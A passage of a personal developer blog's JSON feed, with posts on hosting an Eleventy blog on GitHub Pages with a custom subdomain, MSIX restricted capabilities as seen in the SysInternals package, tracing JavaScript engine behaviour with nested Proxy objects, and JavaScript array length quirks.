			"content_html": "<p><a href=\"https://deletethis.net/dave/2024-05/eleventy-on-github-pages--part-2-/eleventy-github-pages.md\">Previously</a>, I made an Eleventy based GitHub project with GitHub automation to run Eleventy when checking in changes. I stopped at that point because hooking in all my old blog's posts without changing their URIs sounded like a big pain, but now I've decided to go ahead and just link from old blog to new blog and not try to move them.</p>\n<p>This time, I've hooked up a custom subdomain (dave.deletethis.net) to the GitHub output which was surprisingly easy:</p>\n<ol>\n<li>GitHub has <a href=\"https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site#configuring-a-subdomain\">docs on using a custom subdomain</a> which I followed mostly trouble free. The first step is in the GitHub project's Settings, Pages, Custom domain section to set your subdomain. However, this starts a domain check which fails because I haven't done the next step yet.</li>\n<li>I had to edit my DNS records. Previously I had some A records for '*' subdomains which I removed because I realized they weren't in use and added a CNAME record for subdomain <code>dave</code> to <code>david-risney.github.io</code>.</li>\n<li>After waiting a while (for the A record entries to expire) GitHub's domain check succeeded.</li>\n<li>In step 3 GitHub will check in a file named <code>CNAME</code> to your <code>gh-pages</code> branch for you. However, I'm auto generating the contents of the <code>gh-pages</code> branch from my <code>main</code> branch. So I copy the <code>CNAME</code> file to the <code>public</code> folder. Eleventy will copy the contents of the public folder over directly.</li>\n<li>Now that I'm using a custom domain I updated my <code>/eleventy.config.js</code> file's pathPrefix property to <code>/</code> since now the content is rooted at the root path of the domain rather than in a subfolder.</li>\n<li>I also updated <code>/_data/metadata.js</code> to update the name of the blog and the URI of the blog.</li>\n</ol>\n<p>After pushing all these changes I have my Eleventy GitHub blog running on a custom domain. In the future I need to update the template and see if I can start importing content from the old blog.</p>\n",
			"date_published": "2024-05-28T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2023-01/eleventy-on-github-pages/",
			"url": "https://deletethis.net/dave/2023-01/eleventy-on-github-pages/",
			"title": "Eleventy on GitHub Pages",
			"content_html": "<p>I wanted to replace my existing blog solution with a simple markdown setup. I decided to give Eleventy a try and host it on GitHub Pages. Here are the steps I've taken so far:</p>\n<ol>\n<li>Create a new GitHub project using <a href=\"https://github.com/11ty/eleventy-base-blog\">Elventy Base Blog</a> as a project template.</li>\n<li>Used the yml from <a href=\"https://www.rockyourcode.com/how-to-deploy-eleventy-to-github-pages-with-github-actions/\">How to deploy eleventy to github pages with github actions</a> in a new file <a href=\"https://github.com/david-risney/blog/blob/main/.github/workflows/build_eleventy.yml\"><code>.github/workflows/build_eleventy.yml</code></a>.</li>\n<li>I updated some version numbers, and added a permissions contents write per the <a href=\"https://github.com/peaceiris/actions-gh-pages#%EF%B8%8F-first-deployment-with-github_token\">peaceiris/actions-gh-pages help</a>.</li>\n<li>I also made sure to create the <code>gh-pages</code> branch.</li>\n<li>And in the GitHub project's Settings | Pages, set Source to <code>Deploy from a branch</code> and Branch to <code>gh-pages</code>.</li>\n<li>Then I needed to <a href=\"https://github.com/david-risney/blog/commit/583048de085a4dda89ef23f63b8a454ae889376a\">update the pathPrefix setting</a> to <code>/blog/</code> to match my project name.</li>\n</ol>\n<p>With this I've got Eleventy mostly setup and running on GitHub with GitHub Pages to serve the blog and GitHub Actions to rebuild the site whenever I push. Next up, how do I find a better site layout? And after that, the much harder problem of can I move my existing blog content over to this? Maybe in the interim just merge this blog content into deletethis.net.</p>\n",
			"date_published": "2023-01-27T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2022-09/restricted-capabilities-and-msix-apis/",
			"url": "https://deletethis.net/dave/2022-09/restricted-capabilities-and-msix-apis/",
			"title": "Restricted Capabilities and MSIX APIs",
			"content_html": "<p>SysInternals is in the Windows Store? This surprised me since last I knew you couldn't have admin-y utilities as appx packages in the Windows Store.</p>\n<p>Taking a look at their appxmanifest, you can see how they've used restricted capabilities to get admin-like access to what they need. You can view the appxmanifest of any installed package using the <code>Get-AppxPackage</code> PowerShell command and the <code>Get-AppxPackageManifest</code> command:</p>\n<pre class=\"language-powershell\" tabindex=\"0\"><code class=\"language-powershell\">> <span class=\"token punctuation\">(</span><span class=\"token function\">Get-AppxPackage</span> <span class=\"token operator\">*</span>SysInternals* <span class=\"token punctuation\">|</span> <span class=\"token function\">Get-AppxPackageManifest</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>Package<span class=\"token punctuation\">.</span>Capabilities<span class=\"token punctuation\">.</span>OuterXml</code></pre>\n<p>(After formatting the results for you dear reader)</p>\n<pre class=\"language-xml\" tabindex=\"0\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">rescap:</span>Capability</span> <span class=\"token attr-name\">Name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>runFullTrust<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">rescap:</span>Capability</span> <span class=\"token attr-name\">Name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>allowElevation<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token namespace\">rescap:</span>Capability</span> <span class=\"token attr-name\">Name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>unvirtualizedResources<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></code></pre>\n<p>These three <a href=\"https://docs.microsoft.com/en-us/windows/uwp/packaging/app-capability-declarations#restricted-capabilities\">capabilities are all documented</a>:</p>\n<ul>\n<li><code>fullTrust</code> is to run desktop apps from an msix package.</li>\n<li><code>allowElevation</code> is to run your desktop app elevated.</li>\n<li><code>unvirtualizedResources</code> is to skip the normal registry and disk virtualization that is usually done to help sandbox packaged apps and desktop apps from messing with one another.</li>\n</ul>\n<p>But do mere mortals such as you or I get to use restricted capabilities and get your own admin utility app into the Store? The docs say <a href=\"https://docs.microsoft.com/en-us/windows/uwp/packaging/app-capability-declarations#restricted-capability-approval-process\">there is an approval process</a> to use restricted capabilities in the Store so... maybe with extra scrutiny?</p>\n<p>However, the <a href=\"https://docs.microsoft.com/en-us/windows/uwp/packaging/app-capability-declarations\">docs for <code>allowElevation</code></a> are less encouraging:</p>\n<blockquote>\n<p>We don't recommend that you declare this capability in applications that you submit to the Microsoft Store. In most cases, the use of this capability won't be approved.</p>\n</blockquote>\n<p>OK well, I appreciate the bluntness anyway. And elsewhere on that page it tries to steer me away</p>\n<blockquote>\n<p>Note that you can sideload apps that declare restricted capabilities without needing to receive any approval. Approval is only required when submitting these apps to the Store.</p>\n</blockquote>\n<p>So is it still useful to package my utility desktop app as MSIX if I'm not going to put it in the Store? Yes!  There's a whole set of APIs that didn't exist last time I looked in this area. You can <a href=\"https://learn.microsoft.com/en-us/windows/msix/non-store-developer-updates\">check for and install updates to your MSIX app</a>. And similar <a href=\"https://learn.microsoft.com/en-us/windows/msix/app-installer/installing-windows10-apps-web\">docs on installing your non-Store MSIX</a> in the first place.</p>\n<p>(Incidentally that doc mentions how <code>ms-appinstaller:</code> has been disabled. I'd love to read more about what happened there but based on just the name of this URI scheme and my previous life working on URIs I'll make an educated guess.)</p>\n<p>I started looking into all this to see if I should move WebView2Utilities over to MSIX and seems like I really should. Although until I get a <a href=\"https://learn.microsoft.com/en-us/windows/msix/app-installer/installing-windows10-apps-web#signing-the-app-package\">proper code signing certificate</a> seems like this isn't going to happen.</p>\n<p>(Unless I just tell folks to do something dangerous like run a .ps1 file off the github repo that gets the msix, extracts and trusts its cert, then installs the msix...)</p>\n",
			"date_published": "2022-09-16T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2022-09/404-good-news--bad-news/",
			"url": "https://deletethis.net/dave/2022-09/404-good-news--bad-news/",
			"title": "404 Good News, Bad News",
			"content_html": "<p>So much has to go right to get a 404. Machines all over the world talking to each other over a surprisingly large number of protocols. It's almost a disservice to call it an error.</p>\n<p><code>404 Good News Bad News</code></p>\n<p>When I make a browser, the default 404 page is going to be incredibly detailed:</p>\n<blockquote>\n<p>Sorry we couldn't locate your resource, but a number of things went well to get you this far: DNS, TCP/IP connection, the Bombe helped crack Nazi encryption and win WW2, metallurgy invented before at least 5500BC, ...</p>\n</blockquote>\n",
			"date_published": "2022-09-12T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2022-02/watch-javascript-via-proxy/",
			"url": "https://deletethis.net/dave/2022-02/watch-javascript-via-proxy/",
			"title": "Watch JavaScript via Proxy",
			"content_html": "<p>JavaScript has a type <code>Proxy</code> that lets you intercept all interactions with an object - all property reads, writes, method calls, and so on. One fun thing you can do with this is watch how JavaScript itself interacts with your objects.</p>\n<p>If we put a <code>Proxy</code> in another <code>Proxy</code> we can see how JavaScript uses our objects:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">trace</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">obj<span class=\"token punctuation\">,</span> name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Proxy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> <br>        <span class=\"token function-variable function\">get</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">t<span class=\"token punctuation\">,</span> property<span class=\"token punctuation\">,</span> r</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <br>            <span class=\"token function\">logCall</span><span class=\"token punctuation\">.</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> name <span class=\"token operator\">+</span> <span class=\"token string\">' '</span> <span class=\"token operator\">+</span> property<span class=\"token punctuation\">,</span> Reflect<span class=\"token punctuation\">[</span>property<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> Reflect<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">function</span> <span class=\"token function\">logCall</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">description<span class=\"token punctuation\">,</span> fn<span class=\"token punctuation\">,</span> fnThis<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>fnArgs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">const</span> r <span class=\"token operator\">=</span> <span class=\"token function\">fn</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>fnThis<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>fnArgs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>description <span class=\"token operator\">+</span> <span class=\"token string\">'\\n\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>fnArgs<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\n  -->\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>description <span class=\"token operator\">+</span> <span class=\"token string\">'\\n\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span>fnArgs<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\n  -fail->\"</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">throw</span> e<span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span> </code></pre>\n<h2 id=\"how-this-works\" tabindex=\"-1\">How this works <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2022-02/watch-javascript-via-proxy/\">#</a></h2>\n<p><code>trace</code> returns a <code>Proxy</code> around your object that uses <code>Reflect</code> to perform the normal <code>Proxy</code> operations but then <code>console.log</code> the call.</p>\n<p>The constructor for <code>Proxy</code> takes two parameters: first the object you're wrapping, and second an object with functions for all the different kind of object interactions that you want to intercept. Because we want to just log the interaction and not do anything specific we can use a <code>Proxy</code> around <code>Reflect</code> to define this second parameter.</p>\n<p>Our inner <code>Proxy</code> implements the handler of the outer <code>Proxy</code>. The handler is supposed to have methods called <code>get</code>, <code>set</code>, <code>apply</code> and others for each operation to intercept. Instead we define our inner <code>Proxy</code>s <code>get</code> to return a function that will perform the operation and log it using <code>logCall</code>. The function we pass in to <code>logCall</code> to run is one of the functions off of <code>Reflect</code>. <code>Reflect</code> defines all the <code>Proxy</code> handler functions <code>get</code>, <code>set</code>, <code>apply</code> and so on but where each just performs those operations. <code>Reflect</code> is like a convenient default for all <code>Proxy</code> handler functions. We want to perform the default operations but additionally log the result so using <code>Reflect</code> is exactly what we want.</p>\n<h2 id=\"what-you-can-do-with-it\" tabindex=\"-1\">What you can do with it <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2022-02/watch-javascript-via-proxy/\">#</a></h2>\n<p>With that you can call <code>trace</code> with an object and get out a <code>Proxy</code> that acts just like your object but also <code>console.log</code>s every <code>get</code>, <code>set</code>, <code>has</code>, <code>getOwnPropertyDescriptor</code>, and so on that JavaScript asks of your object.</p>\n<p>You can watch how <code>Array.sort</code> sorts an array.</p>\n<p>Or how <code>Array.toString</code> calls <code>Array.join</code>.</p>\n<p>Or how <code>Array.concat</code> checks for <code>Symbol.isConcatSpreadable</code>.</p>\n<p>Check out the corresponding ECMAScript standard and you can see how the logged Proxy calls match the standard defined steps for things like <a href=\"https://tc39.es/ecma262/multipage/indexed-collections.html#sec-array.prototype.sort\">Array.sort</a>.</p>\n<p>Because I pass objects to <code>console.log</code> DevTools will show you an interactive object in the console. If you try it out the log is easier to understand than as text in the gist:</p>\n<pre class=\"language-log\" tabindex=\"0\"><code class=\"language-log\">array get <br>        <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> sort Proxy <span class=\"token operator\">{</span><span class=\"token number\">0</span><span class=\"token operator\">:</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span> <span class=\"token number\">100</span><span class=\"token operator\">}</span> <span class=\"token operator\">)</span> <br>    <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> ƒ sort<span class=\"token operator\">(</span><span class=\"token operator\">)</span> <span class=\"token operator\">{</span> <span class=\"token punctuation\">[</span>native code<span class=\"token punctuation\">]</span> <span class=\"token operator\">}</span></code></pre>\n<p>The above is a <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy/Proxy/get\"><code>Proxy</code> handler's get call</a>. The first param is the array <code>(3) [300, 200, 100]</code> on which we will 'get'. The second param is the string <code>'sort'</code> that is the property to get. The third is our proxy.</p>\n<p>I haven't tried wrapping the return values in trace Proxy although maybe that would give an even better picture of what's happening.</p>\n<p>Various <code>Array</code> functions can operate on a <code>this</code> that is a not an <code>Array</code>. If you're trying to make a non-<code>Array</code> object work with <code>Array</code> functions, then using a <code>Proxy</code> to watch what JavaScript is doing can help debug.</p>\n<h3 id=\"watch-a-for-loop\" tabindex=\"-1\">Watch a <code>for</code> loop <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2022-02/watch-javascript-via-proxy/\">#</a></h3>\n<p>But Proxy watching works for other parts of JavaScript and not just standard functions. For example watch a <code>for</code> loop enumerate over your array:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arr <span class=\"token operator\">=</span> <span class=\"token function\">trace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'array'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> name <span class=\"token keyword\">in</span> arr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span></code></pre>\n<p>And the log:</p>\n<pre class=\"language-log\" tabindex=\"0\"><code class=\"language-log\">array ownKeys<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  <span class=\"token operator\">(</span><span class=\"token number\">4</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'length'</span><span class=\"token punctuation\">]</span><br>array getPrototypeOf<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  <span class=\"token punctuation\">[</span>constructor<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> at<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> concat<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> copyWithin<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> fill<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> …<span class=\"token punctuation\">]</span><br>array getOwnPropertyDescriptor<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> <span class=\"token number\">0</span> <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  <span class=\"token operator\">{</span>value<span class=\"token operator\">:</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> writable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> enumerable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> configurable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token operator\">}</span><br>array getOwnPropertyDescriptor<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> <span class=\"token number\">1</span> <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  <span class=\"token operator\">{</span>value<span class=\"token operator\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> writable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> enumerable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> configurable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token operator\">}</span><br>array getOwnPropertyDescriptor<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> <span class=\"token number\">2</span> <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  <span class=\"token operator\">{</span>value<span class=\"token operator\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> writable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> enumerable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> configurable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token operator\">}</span><br>array getOwnPropertyDescriptor<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> length <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  <span class=\"token operator\">{</span>value<span class=\"token operator\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> writable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> enumerable<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> configurable<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token operator\">}</span></code></pre>\n<p>The <code>for</code> loop asks your object for the names of its properties and then the value of each.</p>\n<h3 id=\"watch-instanceof\" tabindex=\"-1\">Watch <code>instanceof</code> <a class=\"header-anchor\" href=\"https://deletethis.net/dave/2022-02/watch-javascript-via-proxy/\">#</a></h3>\n<p>Or <code>instanceof</code> with your proxy on the left hand side</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\">arr <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">String</span></code></pre>\n<p>And watch JavaScript get the prototype of array</p>\n<pre class=\"language-log\" tabindex=\"0\"><code class=\"language-log\">array getPrototypeOf<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  <span class=\"token punctuation\">[</span>constructor<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> at<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> concat<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> copyWithin<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> fill<span class=\"token operator\">:</span> ƒ<span class=\"token punctuation\">,</span> …<span class=\"token punctuation\">]</span></code></pre>\n<p>Or <code>instanceof</code> with your proxy on the right hand side</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\">String <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">arr</span></code></pre>\n<p>And watch JavaScript ask your array for its <code>Symbol.hasInstance</code> property.</p>\n<pre class=\"language-log\" tabindex=\"0\"><code class=\"language-log\">array get<br>    <span class=\"token operator\">(</span><span class=\"token number\">3</span><span class=\"token operator\">)</span> <span class=\"token punctuation\">[</span><span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">]</span> Symbol<span class=\"token operator\">(</span>Symbol<span class=\"token punctuation\">.</span>hasInstance<span class=\"token operator\">)</span> Proxy<span class=\"token operator\">(</span>Array<span class=\"token operator\">)</span> <span class=\"token operator\">{</span><span class=\"token number\">0</span><span class=\"token operator\">:</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span> <span class=\"token number\">100</span><span class=\"token operator\">}</span> <br>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>  undefined</code></pre>\n<p>(Here's a <a href=\"https://gist.github.com/david-risney/120af7aadb3d3c946e85f46e3869a8eb\">related gist</a>.)</p>\n",
			"date_published": "2022-02-24T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2021-11/javascript-arrays-are-neat/",
			"url": "https://deletethis.net/dave/2021-11/javascript-arrays-are-neat/",
			"title": "JavaScript Arrays are neat",
			"content_html": "<p>JavaScript arrays are unbelievable. If I told you the length property of an array is writable you might chuckle and say 'oh JavaScript'. But no, it goes all the way.</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">const</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>a<span class=\"token punctuation\">.</span>length <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 3</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1,2,3</span></code></pre>\n<p>This seems like a curve where folks very new to programming or very experienced with JavaScript know what this does and folks in the middle say that can't possibly work:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token operator\">--</span>a<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></code></pre>\n<p>As you'd expect given what decreasing length does, increasing length works similarly:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">const</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>a<span class=\"token punctuation\">.</span>length <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 7</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1,2,3,4,5,,</span></code></pre>\n<p>The length property is not configurable so you can't delete it. There's something I like about telling JavaScript to delete length and its just like, 'nah'.</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">delete</span> a<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span></code></pre>\n<p>More fun: The Array functions don't care if they act on an Array. They only require an object with numbered properties and a length property:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">let</span> o <span class=\"token 